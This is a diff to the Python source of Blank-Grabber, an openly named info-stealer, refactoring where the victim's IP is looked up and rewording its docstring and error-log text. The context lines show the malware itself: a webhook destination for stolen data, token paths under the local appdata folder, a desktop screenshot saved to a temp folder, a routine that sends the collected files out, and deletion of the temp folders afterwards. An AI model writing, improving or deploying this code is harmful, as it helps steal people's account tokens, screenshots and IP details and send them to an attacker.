@@ -1,6 +1,6 @@
 """https://github.com/Blank-c/Blank-Grabber
 
-I have marked "Checked" after the path of tokens that I have checked, for the remaining, I don't have those applications so I haven't checked them"""
+I have marked with "Checked" after the path of tokens that I have checked. For the remaining, I don't have any of those applications so I haven't checked them."""
 
 ##########################################
 
@@ -23,6 +23,7 @@ from re import findall
 
 class Blank_Grabber:
     def __init__(self):
+        ip = self.ip_info()
         self.webhook = yourwebhook
         self.files = ""
         self.appdata = os.getenv("localappdata")
@@ -66,8 +67,8 @@ class Blank_Grabber:
             with open(self.logfile, 'r+') as e:
                 logs=e.read()
                 e.seek(0)
-                e.write("This file contains the errors happened, you can figure it out for yourself if you want or make an issue at https://github.com/Blank-c/Blank-Grabber\n\n"+logs)
-        self.SendInfo()
+                e.write("This file contains the errors raised during the execution of the grabber, you can figure it out for yourself if you want or make an issue at https://github.com/Blank-c/Blank-Grabber/issues\n\n"+logs)
+        self.SendInfo(ip)
         shutil.rmtree(self.tempfolder)
         shutil.rmtree(self.tempfolder2)
     
@@ -334,8 +335,9 @@ class Blank_Grabber:
         image = ImageGrab.grab()
         image.save(self.tempfolder + "/Screenshot.png")
 
-    def SendInfo(self):
-        ip = self.ip_info()
+    def SendInfo(self, ip=None):
+        if ip is None:
+            ip = self.ip_info()
         n=0
         for file in os.listdir(self.tempfolder):
             if os.path.isfile(os.path.abspath(os.path.join(self.tempfolder, file))):
